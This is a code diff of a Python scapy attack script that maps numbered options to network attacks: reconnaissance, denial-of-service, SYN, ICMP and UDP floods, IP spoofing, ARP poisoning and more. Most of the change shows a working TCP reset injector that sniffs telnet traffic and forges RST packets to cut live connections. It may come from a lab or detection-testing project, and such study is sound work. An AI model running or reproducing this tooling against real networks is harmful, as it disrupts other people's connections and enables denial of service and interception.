@@ -4,22 +4,22 @@ from scapy.layers.inet import IP, UDP, TCP, ICMP
 
 def attack_to_perform(number):
     switch = {
-        1: perform_reconnaissance,          # first recon attack
-        2: perform_reconnaissance,          # second recon attack
-        3: perform_dos,                     # first dos attack
-        4: perform_dos,                     # second dos attack
-        5: perform_dos,                     # third dos attack
-        6: perform_ftp_attack,              # ftp attack
-        7: perform_sweep,                   # ip address sweep
-        8: perform_port_scan,               # port scan
-        9: perform_ip_spoofing,             # ip spoofing
-        10: perform_os_discovery,           # os discovery
-        11: perform_syn_flood_attack,       # syn flood attack
-        12: perform_icmp_flood_attack,      # icmp flood attack
-        13: perform_udp_flood_attack,       # udp flood attack
-        14: perform_drop_communication,     # drop communication
-        15: perform_arp_poisoning,          # arp poisoning
-        16: perform_special_attack          # special attack
+        1: perform_reconnaissance,  # first recon attack
+        2: perform_reconnaissance,  # second recon attack
+        3: perform_dos,  # first dos attack
+        4: perform_dos,  # second dos attack
+        5: perform_dos,  # third dos attack
+        6: perform_ftp_attack,  # ftp attack
+        7: perform_sweep,  # ip address sweep
+        8: perform_port_scan,  # port scan
+        9: perform_ip_spoofing,  # ip spoofing
+        10: perform_os_discovery,  # os discovery
+        11: perform_syn_flood_attack,  # syn flood attack
+        12: perform_icmp_flood_attack,  # icmp flood attack
+        13: perform_udp_flood_attack,  # udp flood attack
+        14: perform_drop_communication,  # drop communication
+        15: perform_arp_poisoning,  # arp poisoning
+        16: perform_special_attack,  # special attack
     }
 
     if number in switch:
@@ -337,31 +337,38 @@ def perform_drop_communication(ip_addr=None):
     # Sniff packets and execute RST attack
     def packet_handler(packet):
         if packet.haslayer(TCP):
-            if packet.haslayer(Raw):
-                tcp_seg_len = len(packet.getlayer(Raw).load)
-            else:
-                tcp_seg_len = 0
+            if packet[TCP].sport == 23 or packet[TCP].dport == 23:
+                if packet.haslayer(Raw):
+                    tcp_seg_len = len(packet.getlayer(Raw).load)
+                else:
+                    tcp_seg_len = 0
 
-            # Create a TCP RST packet to reset the connection
-            rst_packet = TCP(
-                sport=packet[TCP].sport,
-                dport=packet[TCP].dport,
-                flags="R",
-                seq=packet[TCP].seq + tcp_seg_len,
-                ack=packet[TCP].ack + tcp_seg_len,
-            )
-
-            # Send the RST packet
-            send(IP(src=packet[IP].dst, dst=packet[IP].src) / rst_packet, verbose=0)
-
-            # Print the dropped communication
-            print(
-                "Dropped communication: Source IP: {}, Destination IP: {}, Source Port: {}, Destination Port: {}, Seq: {}, Ack: {}".format(
-                    packet[IP].src, packet[IP].dst, packet[TCP].sport, packet[TCP].dport, packet[TCP].seq, packet[TCP].ack
+                # Create a TCP RST packet to reset the connection
+                rst_packet = TCP(
+                    sport=packet[TCP].sport,
+                    dport=packet[TCP].dport,
+                    flags="R",
+                    seq=packet[TCP].seq + tcp_seg_len,
+                    ack=packet[TCP].ack + tcp_seg_len,
                 )
-            )
+
+                # Send the RST packet
+                send(IP(src=packet[IP].src, dst=packet[IP].dst) / rst_packet, verbose=0)
+
+                # Print the dropped communication
+                print(
+                    "Dropped communication: Source IP: {}, Destination IP: {}, Source Port: {}, Destination Port: {}, Seq: {}, Ack: {}".format(
+                        packet[IP].src,
+                        packet[IP].dst,
+                        packet[TCP].sport,
+                        packet[TCP].dport,
+                        packet[TCP].seq,
+                        packet[TCP].ack,
+                    )
+                )
 
     # Start sniffing packets and call the packet_handler for each captured packet
+    print("Start sniffing...")
     sniff(filter=filter_str, prn=packet_handler)
 
     return "Drop communication performed on IP address: {}".format(ip_addr)
